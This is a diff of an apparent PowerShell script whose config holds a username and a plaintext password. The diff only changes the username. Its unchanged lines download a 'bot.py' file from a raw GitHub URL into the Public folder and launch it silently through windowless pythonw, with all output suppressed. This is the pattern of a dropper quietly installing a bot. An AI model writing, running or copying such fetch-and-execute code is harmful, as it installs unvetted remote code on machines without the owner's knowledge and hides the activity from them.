@@ -1,6 +1,6 @@
 # CONFIG
 # ================================
-$Username = "User"
+$Username = "User0"
 $PasswordPlain = "donotusethisasyourpassword"
 $PythonPath = "python.exe"
 $ScriptPath = "C:\User\Public\bot.py"
@@ -19,3 +19,4 @@ cd $env:PUBLIC *> $null
 curl 'https://raw.githubusercontent.com/Dangongg/expert-octo-broccoli/refs/heads/main/bot.py' -o 'bot.py' *> $null
 Start-Process pythonw.exe -ArgumentList "C:/Users/Public/bot.py" *> $null
 exit
+
